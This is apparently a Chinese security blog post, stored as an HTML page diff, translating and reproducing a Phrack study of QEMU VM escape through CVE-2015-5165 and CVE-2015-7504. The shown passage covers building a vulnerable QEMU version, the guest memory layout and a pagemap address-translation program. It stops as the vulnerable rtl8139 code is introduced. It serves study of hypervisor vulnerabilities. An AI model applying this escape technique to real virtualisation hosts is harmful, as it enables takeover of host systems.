@@ -1,0 +1,1193 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next muse" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="qemu,vm escape,虚拟机逃逸,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="giantbranch's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="声明：首先这篇文章算是翻译+实践的 学习的来源是phrack网站的paper，这个应是上年就看到了，现在才去尝试实践与学习。 其实算是简译再加上自己的实践吧，最后劫持rip起shell由于需要特殊的内核编译才能搞，就没具体实践了，原理上理解了。 看完这篇文章，一句话说明虚拟机逃逸漏洞利用其实就是： 利用qemu代码实现上的漏洞去起一个/bin/sh什么的（当然执行计算器也是可以的），问题是我们在g">
+<meta name="keywords" content="qemu,vm escape,虚拟机逃逸">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VM escape 之 QEMU Case Study">
+<meta property="og:url" content="https://www.giantbranch.cn/2019/07/17/VM escape 之 QEMU Case Study/index.html">
+<meta property="og:site_name" content="giantbranch&#39;s blog">
+<meta property="og:description" content="声明：首先这篇文章算是翻译+实践的 学习的来源是phrack网站的paper，这个应是上年就看到了，现在才去尝试实践与学习。 其实算是简译再加上自己的实践吧，最后劫持rip起shell由于需要特殊的内核编译才能搞，就没具体实践了，原理上理解了。 看完这篇文章，一句话说明虚拟机逃逸漏洞利用其实就是： 利用qemu代码实现上的漏洞去起一个/bin/sh什么的（当然执行计算器也是可以的），问题是我们在g">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1563351291722.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1561273670649.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1561713952144.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1561713929357.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1561794542007.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1562747572213.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1562919332068.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1563244885957.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1563268001815.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1563348038846.jpg">
+<meta property="og:updated_time" content="2023-10-13T13:14:33.058Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="VM escape 之 QEMU Case Study">
+<meta name="twitter:description" content="声明：首先这篇文章算是翻译+实践的 学习的来源是phrack网站的paper，这个应是上年就看到了，现在才去尝试实践与学习。 其实算是简译再加上自己的实践吧，最后劫持rip起shell由于需要特殊的内核编译才能搞，就没具体实践了，原理上理解了。 看完这篇文章，一句话说明虚拟机逃逸漏洞利用其实就是： 利用qemu代码实现上的漏洞去起一个/bin/sh什么的（当然执行计算器也是可以的），问题是我们在g">
+<meta name="twitter:image" content="http://pic.giantbranch.cn/pic/1563351291722.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.giantbranch.cn/2019/07/17/VM escape 之 QEMU Case Study/">
+
+
+
+
+
+  <title>VM escape 之 QEMU Case Study | giantbranch's blog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-121265336-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?e3a097ddc6964e154e65d478725ac9ed";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">giantbranch's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">忘掉掌声，按自己的方式，继续前行，跑过一生</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-book">
+          <a href="/book/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
+            
+            读过的书
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.giantbranch.cn/2019/07/17/VM escape 之 QEMU Case Study/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="giantbranch">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giantbranch's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">VM escape 之 QEMU Case Study</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-17T00:00:00+00:00">
+                2019-07-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/07/17/VM escape 之 QEMU Case Study/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/07/17/VM escape 之 QEMU Case Study/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>声明：首先这篇文章算是翻译+实践的</p>
+<p>学习的来源是phrack网站的paper，这个应是上年就看到了，现在才去尝试实践与学习。</p>
+<p>其实算是简译再加上自己的实践吧，最后劫持rip起shell由于需要特殊的内核编译才能搞，就没具体实践了，原理上理解了。</p>
+<p>看完这篇文章，一句话说明虚拟机逃逸漏洞利用其实就是：</p>
+<p>利用qemu代码实现上的漏洞去起一个<code>/bin/sh</code>什么的（当然执行计算器也是可以的），问题是我们在guest虚拟机里面，我们怎么控制那个/bin/sh呢，那就是通过共享内存交换数据（传递我们的命令到共享内存，最终传递给shell，之后将shell命令的执行结果放入共享内存传递回来guest虚拟机），从而实现在guest虚拟机控制qemu启动的/bin/sh。</p>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>无论企业还是个人，都越来越频繁地使用虚拟化技术，从而引出虚拟机逃逸</p>
+<p>这个案例讲的是CVE-2015-5165 (信息泄露漏洞) and CVE-2015-7504 (堆溢出漏洞)</p>
+<h1 id="KVM-QEMU-总览"><a href="#KVM-QEMU-总览" class="headerlink" title="KVM/QEMU 总览"></a>KVM/QEMU 总览</h1><p>KVM（Kernel Virtual Machine）是Linux的一个内核驱动模块，它能够让Linux主机成为一个Hypervisor（虚拟机监控器）。</p>
+<p>QEMU（quick emulator)本身并不包含或依赖KVM模块，而是一套由Fabrice Bellard编写的模拟计算机的自由软件。QEMU虚拟机是一个纯软件的实现，可以在没有KVM模块的情况下独立运行，但是性能比较低。QEMU使用了KVM模块的虚拟化功能，为自己的虚拟机提供硬件虚拟化加速以提高虚拟机的性能。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>git clone下来后需要回退到漏洞版本</p>
+<p>下面编译成x86_64，并且启用调试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ git clone git://git.qemu-project.org/qemu.git</span><br><span class="line">$ cd qemu</span><br><span class="line">$ git checkout bd80b59</span><br><span class="line">$ mkdir -p bin/debug/native</span><br><span class="line">$ cd bin/debug/native</span><br><span class="line">$ ../../../configure --target-list=x86_64-softmmu --enable-debug \</span><br><span class="line">$                    --disable-werror</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure>
+
+<p>当然可能在编译器前需要下载pixman，autoconf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install libpixman-1-dev</span><br><span class="line">apt install autoconf</span><br></pre></td></tr></table></figure>
+
+<p>之后得装下系统获得一个qcow2的镜像，直接用别人的镜像也行，我下面安装的是ubuntu-16.04.5-server</p>
+<p>我们可以新建硬盘，在启动安装，可能需要vnc连接安装一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qemu-img create -f qcow2 ubuntu.qcow2 20G</span><br><span class="line">qemu-system-x86_64 -enable-kvm -m 2048 -hda /path/to/ubuntu.qcow2 -cdrom /path/to/ubuntu.iso</span><br></pre></td></tr></table></figure>
+
+<p>当然我们也可以通过图形化的virt-manager来安装</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install virt-manager</span><br><span class="line">sudo apt install qemu</span><br><span class="line">sudo apt install qemu-kvm</span><br></pre></td></tr></table></figure>
+
+<p>镜像可能size是我们设置的硬盘大小20G，可以这样缩小为实际占用空间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-img convert -c -O qcow2 ubuntu16.04.qcow2  ubuntu16.04.qcow2.new</span><br></pre></td></tr></table></figure>
+
+<p>有了qcow2镜像后，就可以启动了，添加了漏洞相关的两个网卡rtl8139和pcnet，path_to_image自己修改下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64 -enable-kvm -m 2048 -display vnc=:89 \</span><br><span class="line">   -netdev user,id=t0, -device rtl8139,netdev=t0,id=nic0 \</span><br><span class="line">   -netdev user,id=t1, -device pcnet,netdev=t1,id=nic1 \</span><br><span class="line">   -drive file=&lt;path_to_image&gt;,format=qcow2,if=ide,cache=writeback</span><br></pre></td></tr></table></figure>
+
+<p>当然可以通过添加这个参数<code>-redir tcp:5022::22</code>映射ssh端口，我们连接5022即可连接qemu里面的ssh</p>
+<p>注意vnc的端口是5989（默认端口是5900，5900+89 = 5989，89是上面的参数）</p>
+<p>别人直接attach去调试是可以的，但是我们attach上去之后就不能再c了，不知道为何，也没下断点，怎么就有一个-1的断点呢，知道如何解决的告诉我。</p>
+<p><img src="http://pic.giantbranch.cn/pic/1563351291722.jpg" alt></p>
+<p>所以我只能直接gdb启动qemu了，</p>
+<p>调试示例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb --args ./qemu-system-x86_64 -enable-kvm -m 2048   -netdev user,id=t0, -device rtl8139,netdev=t0,id=nic0    -redir tcp:5022::22    -netdev user,id=t1, -device pcnet,netdev=t1,id=nic1    -drive file=/ubuntu16.04.qcow2,format=qcow2,if=ide,cache=writeback</span><br></pre></td></tr></table></figure>
+
+<h2 id="QEMU内存布局"><a href="#QEMU内存布局" class="headerlink" title="QEMU内存布局"></a>QEMU内存布局</h2><p>guest虚拟机的物理内存实际上是qemu程序mmap出来的一块private属性的虚拟内存。而且PROT_EXEC这个标志在这个虚拟内存中是不启用的</p>
+<p>下面作者的图比较直观</p>
+<p><img src="http://pic.giantbranch.cn/pic/1561273670649.jpg" alt></p>
+<p>我们去查maps文件的时候，也可以看出来，上面qemu启动命令所设置的2G内存</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ sudo cat /proc/5291/maps</span><br><span class="line">55dad0b86000-55dad1124000 r-xp 00000000 08:01 665015                     /XXXXX/XXXXX/qemu-system-x86_64</span><br><span class="line">55dad1323000-55dad13ed000 r--p 0059d000 08:01 665015                     /XXXXX/XXXXX/qemu-system-x86_64</span><br><span class="line">55dad13ed000-55dad146a000 rw-p 00667000 08:01 665015                     /XXXXX/XXXXX/qemu-system-x86_64</span><br><span class="line">55dad146a000-55dad18d9000 rw-p 00000000 00:00 0 </span><br><span class="line">55dad1f65000-55dad3b83000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">7f1a1c000000-7f1a1c022000 rw-p 00000000 00:00 0 </span><br><span class="line">7f1a1c022000-7f1a20000000 ---p 00000000 00:00 0 </span><br><span class="line">7f1a20000000-7f1aa0000000 rw-p 00000000 00:00 0 						//这个就是2G内存</span><br><span class="line">7f1aa0000000-7f1aa07a0000 rw-p 00000000 00:00 0 </span><br><span class="line">7f1aa07a0000-7f1aa4000000 ---p 00000000 00:00 0 </span><br><span class="line">7f1aa4acb000-7f1aa8000000 rw-p 00000000 00:00 0 </span><br><span class="line">7f1aa8000000-7f1aa809e000 rw-p 00000000 00:00 0 </span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>上面那个为啥是2G，你看看下面的2G的大小，以及下面的地址差</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(2*1024*1024*1024)</span><br><span class="line">&apos;0x80000000&apos;</span><br><span class="line">&gt;&gt;&gt; hex(0x7f1aa0000000 - 0x7f1a20000000)</span><br><span class="line">&apos;0x80000000&apos;</span><br></pre></td></tr></table></figure>
+
+<h2 id="地址转换"><a href="#地址转换" class="headerlink" title="地址转换"></a>地址转换</h2><p>这里面有两层转换</p>
+<p>1、从guest 的虚拟机地址 to guest 的物理地址</p>
+<p>2、从 guest 的物理地址 to QEMU’s 虚拟地址空间</p>
+<p>假如知道了上一小节，这个就不难理解了</p>
+<p>在64位系统，虚拟地址是由页面偏移（0到11 bits）和页号组成的。</p>
+<p>而且pagemap页面映射文件给了用户空间的进程CAP_SYS_ADMIN权限去找到虚拟地址与物理地址的映射</p>
+<p>pagemap页面映射文件包含的虚拟页面是一个64位的值，如下面所示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- Bits 0-54  : physical frame number if present.</span><br><span class="line">- Bit  55    : page table entry is soft-dirty.</span><br><span class="line">- Bit  56    : page exclusively mapped.</span><br><span class="line">- Bits 57-60 : zero</span><br><span class="line">- Bit  61    : page is file-page or shared-anon.</span><br><span class="line">- Bit  62    : page is swapped.</span><br><span class="line">- Bit  63    : page is present.</span><br></pre></td></tr></table></figure>
+
+<p>为了将虚拟地址转换成物理地址，使用Nelson Elhage的代码，下面的程序申请了一个buffer，并写入字符串——“Where am I?”，之后打印他的物理地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;assert.h&gt;</span><br><span class="line">#include &lt;inttypes.h&gt;</span><br><span class="line"></span><br><span class="line">#define PAGE_SHIFT  12</span><br><span class="line">#define PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span><br><span class="line">#define PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="line">#define PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span><br><span class="line"></span><br><span class="line">int fd;</span><br><span class="line">// 获取页内偏移</span><br><span class="line">uint32_t page_offset(uint32_t addr)</span><br><span class="line">&#123;</span><br><span class="line">	// addr &amp; 0xfff</span><br><span class="line">    return addr &amp; ((1 &lt;&lt; PAGE_SHIFT) - 1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint64_t gva_to_gfn(void *addr)</span><br><span class="line">&#123;</span><br><span class="line">    uint64_t pme, gfn;</span><br><span class="line">    size_t offset;</span><br><span class="line"></span><br><span class="line">    printf(&quot;pfn_item_offset : %p\n&quot;, (uintptr_t)addr &gt;&gt; 9);</span><br><span class="line">    offset = ((uintptr_t)addr &gt;&gt; 9) &amp; ~7;</span><br><span class="line"></span><br><span class="line">    ////下面是网上其他人的代码，只是为了理解上面的代码</span><br><span class="line">    //一开始除以 0x1000  （getpagesize=0x1000，4k对齐，而且本来低12位就是页内索引，需要去掉），即除以2**12, 这就获取了页号了，</span><br><span class="line">    //pagemap中一个地址64位，即8字节，也即sizeof(uint64_t)，所以有了页号后，我们需要乘以8去找到对应的偏移从而获得对应的物理地址</span><br><span class="line">    //最终  vir/2^12 * 8 = (vir / 2^9) &amp; ~7 </span><br><span class="line">    //这跟上面的右移9正好对应，但是为什么要 &amp; ~7 ,因为你  vir &gt;&gt; 12 &lt;&lt; 3 , 跟vir &gt;&gt; 9 是有区别的，vir &gt;&gt; 12 &lt;&lt; 3低3位肯定是0，所以通过&amp; ~7将低3位置0</span><br><span class="line">    // int page_size=getpagesize();</span><br><span class="line">    // unsigned long vir_page_idx = vir/page_size;</span><br><span class="line">    // unsigned long pfn_item_offset = vir_page_idx*sizeof(uint64_t);</span><br><span class="line"></span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, 8);</span><br><span class="line">    // 确保页面存在——page is present.</span><br><span class="line">    if (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        return -1;</span><br><span class="line">    // physical frame number </span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    return gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint64_t gva_to_gpa(void *addr)</span><br><span class="line">&#123;</span><br><span class="line">    uint64_t gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != -1);</span><br><span class="line">    return (gfn &lt;&lt; PAGE_SHIFT) | page_offset((uint64_t)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    uint8_t *ptr;</span><br><span class="line">    uint64_t ptr_mem;</span><br><span class="line">    </span><br><span class="line">    fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY);</span><br><span class="line">    if (fd &lt; 0) &#123;</span><br><span class="line">        perror(&quot;open&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ptr = malloc(256);</span><br><span class="line">    strcpy(ptr, &quot;Where am I?&quot;);</span><br><span class="line">    printf(&quot;%s\n&quot;, ptr);</span><br><span class="line">    ptr_mem = gva_to_gpa(ptr);</span><br><span class="line">    printf(&quot;Your physical address is at 0x%&quot;PRIx64&quot;\n&quot;, ptr_mem);</span><br><span class="line"></span><br><span class="line">    getchar();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们将上面这个代码编译后，放到qemu运行（root权限）</p>
+<p><img src="http://pic.giantbranch.cn/pic/1561713952144.jpg" alt></p>
+<p>之后我们在主机gdb attach到qemu的pid（root权限）</p>
+<p>查看分配给qemu虚拟机对应的内存，我们分配的是2G，所以大小是0x8000000</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ info proc mappings</span><br><span class="line">process 2776</span><br><span class="line">Mapped address spaces:</span><br><span class="line"></span><br><span class="line">          Start Addr           End Addr       Size     Offset objfile</span><br><span class="line">      0x56154915f000     0x5615497a2000   0x643000        0x0 /XXXXXXXXXX/qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64</span><br><span class="line">      0x5615499a1000     0x561549a71000    0xd0000   0x642000 /XXXXXXXXXX/qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64</span><br><span class="line">      0x561549a71000     0x561549af7000    0x86000   0x712000 /XXXXXXXXXX/qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64</span><br><span class="line">      0x561549af7000     0x561549f87000   0x490000        0x0</span><br><span class="line">      0x56154b0fc000     0x56154cd14000  0x1c18000        0x0 [heap]</span><br><span class="line">      0x7fcdd4000000     0x7fcdd40b8000    0xb8000        0x0</span><br><span class="line">      0x7fcdd40b8000     0x7fcdd8000000  0x3f48000        0x0</span><br><span class="line">      0x7fcdd86c9000     0x7fcddbe00000  0x3737000        0x0</span><br><span class="line">      0x7fcddbe00000     0x7fcddbe01000     0x1000        0x0</span><br><span class="line">      0x7fcddbeff000     0x7fcddc000000   0x101000        0x0</span><br><span class="line">      0x7fcddc000000     0x7fce5c000000 0x80000000        0x0            &lt;=========就这个      </span><br><span class="line">      0x7fce5c000000     0x7fce5c883000   0x883000        0x0</span><br><span class="line">      0x7fce5c883000     0x7fce60000000  0x377d000        0x0</span><br><span class="line">	  。。。。。。</span><br><span class="line">	  。。。。。。</span><br><span class="line">	  。。。。。。</span><br></pre></td></tr></table></figure>
+
+<p>可以看到确实可以在这个虚拟地址看到我们字符串</p>
+<p><img src="http://pic.giantbranch.cn/pic/1561713929357.jpg" alt></p>
+<h1 id="信息泄露利用的实现"><a href="#信息泄露利用的实现" class="headerlink" title="信息泄露利用的实现"></a>信息泄露利用的实现</h1><p>下面是CVE-2015-5165，一个 RTL8139 网卡设备模拟器的内存信息泄露漏洞</p>
+<p>我们需要获得下面两种地址<br>1、.text段的基址来构建我们的shellcode<br>2、guest虚拟机的物理地址，以便得到一些虚拟结构的地址</p>
+<h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><p>REALTEK 网卡支持两种模式：C 和 C+，问题在C+模式的时候，网卡设备模拟器错误地计算了IP数据包数据的长度并最终发送了比实际数据包中的更多数据。</p>
+<p>漏洞在<code>hw/net/rtl8139.c</code>文件的rtl8139_cplus_transmit_one的函数中</p>
